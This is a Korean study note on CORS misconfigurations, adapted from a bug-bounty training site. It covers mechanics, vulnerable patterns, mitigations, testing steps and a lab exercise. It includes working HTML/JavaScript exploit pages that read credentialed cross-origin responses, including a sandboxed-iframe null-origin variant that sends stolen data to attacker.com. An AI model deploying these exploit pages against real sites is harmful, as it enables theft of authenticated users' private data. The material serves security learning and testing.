# 취약한 CORS 구성

개인 공부용으로 참고하기 위해서 버그바운티 클럽의 Pentest Gym에서 퍼온 사진과 글을 참고하여 정리한 문서입니다. 

| 출처 : https://www.bugbountyclub.com/pentestgym/view/60

# CORS란?
CORS(Cross-site Origin Sharing, 교차 출처 리소스 공유)는 특정 웹 애플리케이션의 리소스를 다른 출처(Origin)에서 요청하고 접근할 수 있도록 하는 웹 브라우저 기술이다. 여기서 말하는 출처란 일반적인 URL 체계에서 프로토콜(http://, https://와 같은), 도메인, 포트번호 까지 말하며, CORS에 의해 http://aaa.com이라는 웹 사이트에서 http://bbb.com의 리소스를 요청하고 대응되는 응답 내용에 접근할 수 있게 된다.

# 왜 CORS를 사용할까?
SOP(Same Origin Policy, 동일 출처 정책)는 출처가 서로 다른 웹 사이트간의 리소스 공유를 원천적으로 차단하고 리소스가 호스팅되는 출처 내에서만 접근이 가능하도록 보호하는 역할을 한다. 하지만 개발자는 때떄로 저마다의 이유로 인해서 SOP를 완하고 다른 출처의 리소스를 접근해야할 상황에 직면하는 경우가 많다. 요즘 대부분의 웹은 다른 출처의 리소스를 사용한다. 대표적으로 API 서버를 생각해볼 수 있다. 어떤 http://example.com 이라는 웹 사이트가 있는데, 별도로 구성된 API 서버(http://api.example.com)에 자바스크립트를 통한 XMLHttpRequest 요청을 보내 JSON 데이터를 추출해오거나 어떤 기능을 수행하기도 한다. 
이를 위해서 http://example.com에서 시작된 요청이 웹 브라우저의 SOP 적용을 받지 않고 출처가 다른 http://api.example.com의 리소스에 접근할 수 있어야한다.
이것을 가능하게 해주는 것이 바로 CORS이다. CORS가 등장하기 이전에는 JOSNP 등의 방법을 이용하여 SOP를 우회했고 이러한 작업으로 인해 다른 보안 문제가 발생하기도 했다. 따라서 안전한 방법으로 SOP를 완화하고 필요에 따라 출처가 다른 웹 사이트의 리소스 접근을 허용할 수 있도록 해주는 CORS가 등장했다.

# CORS의 동작
CORS는 일반적으로 HTTP 요청과 응답에 특수한 요청헤더와 응답헤더를 추가함으로 써 동작하게 된다.

## 단순 요청(Simple Request)
http://example.com에서 http://api.example.com/some-data으로 Ajax GET 요청을 통해 데이터를 받아오는 상황을 예로든다. 이때 http://example.com은 자기 자신의 도메인 값을 가진 Origin 헤더를 추가하여 요청을 보낸다
```
GET /some-data HTTP/1.1
Host: api.example.com
Origin: http://example.com
...생략...
```
위 요청을 받은 API서버(http://api.example.com)는 다음과 같은 응답에 Access-Control-Allow-Origin 헤더를 추가하여 응답한다
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://example.com
...생략...
```
추가된 ACAO 헤더의 의미는 요청된 리소스를 http://example.com에게 접근을 허용한다는 의미이다.
![](https://www.bugbountyclub.com/uploads/images/training/1632808652.png)

이러한 단순 요청은 특정 조건들이 만족되는 일부 상황에서만 사용되는 방식이다.
- HTTP 메소드가 GET, POST, HEAD 중 하나여야함
- 웹 브라우저에 의해 자동으로 설정되는 헤더만 사용해야한다 : Connection, User-Agent 등 -> 즉 사용자가 정의한 커스텀 헤더가 없어야한다.
- 수동으로 설정 가능한 헤더 중 다음의 헤더만 사용해야한다 : Accept, Accept-Language, Content-Language, Content-Type (헤더 값이 application/x-www-form-urlencoded, multipart/form-data, text/plain인 경우에만 해당)

## 프리플라이트 요청(Preflighted Request)
메인 요청에 앞서 프리플라이트 요청이라는 것을 보내서 클라이언트와 서버간 협의 과정을 거치게 된다. 단지 단순 요청보다 수행되는 단계가 하나 더 있을 뿐이다. 프리플라이트 요청 방법에는 프리플라이트 요청과 메인 요청 두 단계로 구분해 볼 수 있다.

1. 프리플라이트 요청
클라이언트가 OPTIONS 헤더를 이용해 메인 요청에 사용될 HTTP 메소드의 종류와 커스텀 헤더 이름을 보내고 서버는 이에 대한 허용 여부를 클라이언트에게 알려주게 된다
API 서버로 다시 예를 들어 살펴보자
```
OPTIONS /some-data HTTP/1.1
Host:api.example.com
Origin: http://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom-Header
...생략...
```
이와 같은 요청을 먼저 보내본다. 위 요청은 크로스 도메인 리소스 요청에 사용할 메소드는 POST이고, X-Custom-Header라는 헤더를 사용할 것임을 서버에 알려준다
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://example.com
Access-Control-Allow-Method: POST
Access-Control-Allow-Headers: X-Custom-Header
...생략...
```
서버는 위와 같은 응답을 보내서 POST 메소드와 X-Custom-Header를 용청에 사용할 수 있음을 알려주게 되는 것이다.
![](https://www.bugbountyclub.com/uploads/images/training/1632808718.png)

## 자격증명이 있는 CORS 요청(Credential Request)
웹 브라우저는 HTTP 요청에 쿠키를 포함시켜 전송한다. 하지만 보안상의 이유로 JS내에서는 XMLHttpRequest를 통한 Cross-Origin 요청은 기본적으로 쿠키를 포함시키지 않는다. XMLHttpRequest로 출처가 다른 웹 사이트에 자격증명이 포함된 요청을 전송하기 위해선 `withCredentials`를 true로 설정해줘야한다.
```
const xhr = new XMLHttpRequest();
const url = 'http://api.example.com/some-data';
...
function sendRequest() {
    xhr.open('GET', url, true);
    xhr.withCredentials = true;
    ...생략...
    xhr.send();
}
```
위와 같이 작성된 자격증명이 포함된 Cross-Origin 요청에 대해 서버는 다음과 같이 True 값을 갖는 Access-Control-Allow-Credentials 헤더 (ACAC 헤더)를 응답에 추가하여 리소스 접근을 허용할 수 있다.
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://example.com
Access-Control-Allow-Credentials: True
...생략...
```
만일 Access-Control-Allow-Credentials: True가 없다면 웹 브라우저는 응답의 내용을 표시하지 않게 된다
위 요청과 응답은 GET 메소드를 사용하는 등 단순 요청의 조건을 충족하므로 프리플라이트 요청 단계없이 아래와 같이 동작하게 된다
![](https://www.bugbountyclub.com/uploads/images/training/1632808763.png)

주의할 점은 만일 서버가 ACAO 헤더에 와일드 카드를 써서 응답하는 경우에는 withCredentials를 true로 설정하였다고 하더라고 웹 브라우저에 의해 쿠키 전송은 차단된다. 자격증명 전송을 허용해야한다면 ACAO 헤더에 와일드카드를 사용할 수 없고 특정 출처를 명시해줘야한다.

- ACAO 헤더가 와일드카드이므로 쿠키가 전송되지 않음
```
Access-Control-Allow-Origin: *                 
Access-Control-Allow-Credentials: True
```
- ACAO 헤더가 특정 출처를 명시하고 ACAC가 true이므로 쿠키가 정상적으로 전송됨
```
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
```

# 취약한 CORS 구성이란?

## ACAO 헤더에 Origin 요청 헤더의 값을 그대로 사용
어떤 웹 사이트들은 Origin 요청 헤더의 값을 ACAO 응답 헤더에 사용하여 Cross-Origin 요청을 허용한다. 이런 경우 보통 CORS 정책을 자동화 하려는 게으른 개발자에 의해 구현된다. 이와 같이 동작하는 것은 웹사이트 출저가 다른 모든 웹 사이트에 대항 리소스를 제공하는 꼴이된다. 사실상 CORS 설정을 무용지물로 만드는 것과 다름 없다
![](https://www.bugbountyclub.com/uploads/images/training/1632808913.png)

만일 공격자가 자신의 웹사이트(attack.com)에서 other-origin.com으로 자격증명이 필요한 Cross-Origin 요청을 하는 악성코드를 만들어두었다고 했을때, 이 악성코드를 other-origin.com에 인증을 완료한 누군가가 실행한다면 아무런 제약없이 피해자의 민감정보를 포함해 리소스를 공격자의 웹사이트에서 접근할 수 있게 된다.

## 안전하지 않은 정규표현식으로 Origin 헤더 검증
정규표현식을 사용해 Origin 헤더를 통해 받은 출처가 리소스 접근을 허용하는 출처에 해당하는지 검증하는 웹 사이트가 있다. 적절한 정규 표현식은 효과적으로 악용을 막을 수 있지만, 정규표현식이 안전하지 않다면 우회할 수 있다.
```
regexp = "[a-z]+.example.com";
```
이 정규표현식을 보면 example.com의 하위 도메인에게만 접근을 허용하는 것 같지만, 정규표현식에서 점(.)의 의미는 모든 문자를 의미한다. 공격자가 attackexample.com 도메인을 준비한다면 이 검증 로직은 손쉽게 우회할 수 있게 된다.
![](https://www.bugbountyclub.com/uploads/images/training/1632895890.png)

비슷한 경우로 Origin 헤더가 유효한 도메인으로 시작되는지 검증하는 경우도 있다.
```
regexp = "example.com.+[a-z]";
```
이 정규표현식을 사용한 검증 로직은 http://example.com으로 시작되는 모든 출처에 대해 리소스 접근을 허용하게 되고, 공격자는 그저 http://example.com.attcker.com 또는 http://example.comattachker.com 등의 도메인을 준비한다면 우회할 수 있다.

## NULL 출처 허용
Origin 헤더는 NULL 값을 가질 수 있는데 `RFC6454 Web Origin Concept`문서를 보면 개인정보에 민감한 컨텍스트에서 HTTP 요청을 발행 할때 Origin 헤더를 NULL로 발행해야한다고 명시하고 있다.
```
7.1 User Agent Requirements

The user agent may include an Origin header field in any HTTP request. The user agent must not include more than one Origin header field in any HTTP request.
Whenever a user agent issues an HTTP request from a "privacy-sensitive" context, the user agent must send the value "null" in the Origin header field.
(번역)
유저 에이전트는 모든 HTTP 요청에 Origin 헤더 필드를 포함할 수 있습니다. 유저 에이전트는 HTTP 요청에 둘 이상의 Origin 헤더 필드를 포함해서는 안 됩니다.
유저 에이전트가 "개인정보에 민감한(privacy-sensitive)" 컨텍스트에서 HTTP 요청을 발행할 때마다 유저 에이전트는 Origin 헤더 필드에 "null" 값을 보내야 합니다.
```
이 문서에서는 개인정보에 민감한 컨텍스트를 명확히 정의하지는 않았지만 알려진 바로는 로컬 환경에서 Cross-Origin 요청이 발샐할 때와 Cross-Origin 요청이 또 다른 웹 사이트로 리다이렉트될 때 Origin 헤더를 NULL로 변경해야한다. 라고한다.

이런 이유로 로컬 환경에서 개발하는 개발자들은 가끔 NULL Origin 요청에 대해 리소스 접근을 허용하도록 서버를 설정하곤 한다.
- 요청 (null 값을 갖는 Origin 헤더가 발행됨)
```
GET /sensitive-data HTTP/1.1
Host: other-origin.com
Origin: null
Cookie: mysessid=some-value
...생략...
```
- 응답 (ACAO 헤더를 통해 null Origin에 대한 접근을 허용)
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: True
...생략...
```
개발이 끝난후 허용된 NULL Origin을 제거하지 않고 그대로 방치한 채 호스팅하게 되면 Sandbox 처리된 iframe을 통한 공격에 악용될 수 있다. 공격자가 작성한 악성스크립트를 attacker.com/malpage에서 호스팅하고 피해자가 malpage를 방문했다고 가정할 경우 다음과 같은 과정을 통해서 피해자의 민감한 정보를 획득 할 수 있음.
![](https://www.bugbountyclub.com/uploads/images/training/1632880158.png)


## 와일드카드 출처 허용
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: True
```
이와 같은 자격증명이 포함된 요청이 있다, 웹 리소스에 누구에게나 공개된 정보만 포함된 경우에는 와일드카드 출처를 허용하는 것이 위험하지 않은 것으로 간주되지만, 경우에 따라 일부 취약한 사례가 있을 수 있다.
개발자가 HTTP 응답 메세지에 키값이나 패스워드 등의 민감한 정보를 포함하는 웹 리소스에 대해 와일드카드로 허용한 경우가 이에 해당한다. 공격자는 별다른 제약 없이 민감한 정보를 획득하고 이 정보를 바탕으로 후속 공격을 수행할 수 있을지도 모른다.
![](https://www.bugbountyclub.com/uploads/images/training/1632886694.png)

# 취약한 CORS 구성 예방 및 완화

## 신뢰할 수 있는 도메인 관리 및 안전한 검증
웹 리소스에 접근할 수 있는 신뢰할 수 있는 도메인을 관리하고 화이트리스트 방식으로 안전하게 검증하여 요청을 발행한 출처가 신뢰할 수 있는 도메인 목록에 있는 경우에만 ACAO 헤더에 해당 출처를 지정해야한다.

## NULL 출처 허용 금지
공격자는 샌드박스 처리된 iframe을 Origin 헤더에 NULL을 지정해 요청할 수 있으므로, NULL 출처를 리소스 접근 허용 목록에 포함시키지 말아야한다.

## 와일드 카드 출처 허용 금지
민감한 정보가 포함된 웹 리소스에 대해서는 와일드카드 출처를 허용해서는 안된다. 와일드카드를 사용해 출처에 대해 리소스 접근을 허용해야할 경우에만 민감한 정보가 포함되어 있는지 철저히 확인하고 제거해야한다

# 취약한 CORS 구성 테스트 방법

## 1. 민감한 정보를 반환하는 요청 식별
웹 브라우저에 ZAP 프록시 또는 Burp Suite 프록시 도구를 설정하고 웹 애플리케이션 도구를 모두 사용해본다. 탐색하면서 사용자의 개인 정보나 민감한 정보가 응답에 포함된 경우 엔드포인트를 찾는다

## 2. CORS 취약 여부 테스트
식별한 엔드포인트를 이용해 아래와 같이 임의의 출처가 지정된 Origin 헤더를 추가하거나 이미 존재하는 경우 Origin 헤더의 출처를 변경하여 요청해본다
사용하는 출처는 어디라도 상관없다
```
Origin: https://attacker.com
```
그리고 요청을 통해 반환되는 응답 메세지에 CORS를 위해 사용되는 응답 헤더가 포함되는지 또는 이미 존재할 경우 ACAO 헤더에 어떤 변화가 있는지 확인한다. 응답 메시지에 아래와 같은 유형으로 CORS 관련 헤더가 표시되면 해당 엔드포인트는 잠재적으로 취약하고 악용이 가능할 수 있다.


### 1. 반사된 ACAO, True ACAC
Origin 요청 헤더를 통해 전송된 출처가 그대로 ACAO 응답 헤더에 반사되어 표시되고 ACAC 헤더가 True가 설정되어있는 경우이다.
```
HTTP/1.1 200 OK
...생략...
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: True
...생략..
```
이와 같은 형태의 응담이 CORS 구성 테스트를 하며 만나볼 수 있는 최상의 사례이다. 만약 서버가 Origin 헤더의 값에 대해 어떠한 검증도 하지 않는다면 테스터는 자신의 웹 사이트에서 호스팅 되는 아래와 같은 익스플로잇 페이지를 통해 응답 메시지에 표시된 민감한 데이터를 획득 할 수도 있다.
```
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
	       var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
		        	document.getElementById("demo").innerHTML = this.responseText;
	        	}
         	};
         	xhr.open("GET", "https://vulnerable.com/path_to_get_data", true); //취약한 웹의 진입점으로 변경
         	xhr.withCredentials = true;
         	xhr.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS Exploit</h2>
      <h3>Response contents</h3>
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>
```

### 2. NULL ACAO, True ACAC
ACAO 헤더에 null이 허용되고, ACAC 헤더가 True로 설정되어있는 경우
```
HTTP/1.1 200 OK
...생략...
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: True
...생략...
```
이전과 다른 점은 ACAO가 null 이라는 점 뿐이다. 그렇다면 우리는 취약한 웹 애플리케이션으로 null 출처를 가진 Cross-Origin 요청을 보낼 수 있어야한다.
몇가지 있지만 Sandbox 처리된 iframe을 통해서 가능하다. 아래와 같은 익스플로잇을 작성한 한다.
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
        function cors() {
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {
                                document.getElementById('demo').innerText = this.responseText;
                        }
                };
                xhr.open('get','https://vulnerable.com/path_to_get_data',true); //취약한 웹의 진입점으로 변경
                xhr.withCredentials = true;
                xhr.send();             
        };
</script>
<center>
<h2>CORS Exploit</h2>
<button type='button' onclick='cors()'>Exploit</button>
<hr>
<h3>Response</h3>
</center>
<div id='demo'>
</div>" width="100%" height="50%" style="background-color:#e1caca;">
</iframe>
```
Exploit 버튼을 클릭하면 iframe 내부에 취약한 웹 애플리케이션에서 가져온 응답 메세지가 표시되게 된다. 악의저깅ㄴ 공격자가 실제 공격에 사용될 때는 아래와 같이 공격자의 웹으로 응답메시지를 전송하는 코드를 사용할 수 있다
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
   <script>
      var xhr = new XMLHttpRequest();
      xhr.onload = reqListener;
      xhr.open('get','https://vulnerable.com/path_to_get_data',true); //취약한 웹의 진입점으로 변경
      xhr.withCredentials = true;
      xhr.send();
      function reqListener() {
         location='https://attacker.com/getdata?restxt='+encodeURIComponent(this.responseText);
      };
   </script>">
</iframe>
``` 

# 실습 문제 풀이
kali linux의 burp suite를 이용하여 실습을 진행한다.

## Exercise 1
| 이 문제는 개발자가 CORS 설정을 자동화했습니다. 하지만 개발자의 실수로 인해 모든 출처에 대해 웹 리소스를 허용하는 실수를 저질렀고 이로 인해 사용자의 프로필 정보가 악의적인 사용자에게 유출될 수 있습니다.
```
Origin: http://example.com

Access-Control-Allow-Origin: http://example.com
Access-Control-Allow-Credentials: true

centos7에서 apache 웹 서버를 생성해 익스플로잇 코드를 넣어 호스팅한 후에 Exploit 버튼을 눌러 나온 출력 결과
<form action="" method="POST">
<table>
<tr>
<td>Username: </td>
<td><input type="text" id="user_name" name="user_name" value="Spike Spigel"></td>
</tr>
<tr>
<td>E-mail: </td>
<td><input type="text" id="email" name="email" value="spike@bugbountyclub.com"></td>
</tr>
<tr>
<td>Gender: </td>
<td>
<select name="gender" id="gender">
<option value="M" selected="selected" >Male</option>
<option value="F" >Female</option>
</select>
</td>
</tr>
<tr>
<td>Birthday: </td>
<td><input type="date" id="birth_date" name="birth_date" value="1998-01-14"></td>
</tr>
</table>
<br/>
<input class="btn btn-success" type="submit" name="submit" id="submit" value="Change">
</form>

</div>
</body>
</html>
```




